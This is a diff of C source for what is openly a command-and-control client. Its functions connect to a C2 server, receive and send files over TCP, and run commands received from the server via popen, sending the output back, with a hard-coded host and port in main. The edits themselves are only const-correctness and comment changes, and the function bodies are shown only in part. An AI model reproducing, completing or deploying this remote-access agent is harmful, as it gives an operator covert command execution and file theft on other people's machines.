@@ -52,7 +52,7 @@ int c2_connect(SOCKET connect_socket, const char* host, const int port) {
 }
 
 // Function to copy bytes to new memory block/location to abide strict aliasing.
-inline uint32_t ntohl_conv(char const* num) {
+inline uint32_t ntohl_conv(char* const num) {
 	uint32_t new;
 	memcpy(&new, num, sizeof(new));
 
@@ -62,17 +62,17 @@ inline uint32_t ntohl_conv(char const* num) {
 
 
 // Function to receive file from client (TCP file transfer).
-int recv_file(char* buf, char* filename, SOCKET connect_socket) {
+int recv_file(char* const buf, const char* filename, SOCKET connect_socket) {
 	FILE* fd = fopen(filename, "wb");
 
 	// Receive file size.
 	if (recv(connect_socket, buf, sizeof(uint32_t), 0) < 1)
 		return SOCKET_ERROR;
 
-	// Deserialize buf bytes.
+	// Serialize f_size.
 	uint32_t f_size = ntohl_conv(&*(buf));
 
-	// Receive all file bytes/chunks and write to file.
+	// Receive all file bytes/chunks and write to parsed filename.
 	int iResult = 1;
 	long int total = 0;
 
@@ -88,7 +88,7 @@ int recv_file(char* buf, char* filename, SOCKET connect_socket) {
 }
 
 // Function for sending file to client (TCP file transfer).
-int send_file(char* filename, SOCKET connect_socket, char* buf) {
+int send_file(const char* filename, SOCKET connect_socket, char* const buf) {
 	// Open file.
 	FILE* fd = fopen(filename, "rb");
 
@@ -131,7 +131,7 @@ int send_file(char* filename, SOCKET connect_socket, char* buf) {
 }
 
 // Function to execute command.
-int exec_cmd(SOCKET connect_socket, char* buf) {
+int exec_cmd(SOCKET connect_socket, char* const buf) {
 	// Call Popen to execute command(s) and read the process' output.
 	strcat(buf, " 2>&1");
 
@@ -180,6 +180,7 @@ int exec_cmd(SOCKET connect_socket, char* buf) {
 
 // Main function for connecting to c2 server & parsing c2 commands.
 int main(void) {
+	// immutable host and port.
 	const char host[] = "127.0.0.1";
 	const int port = 4443;
 
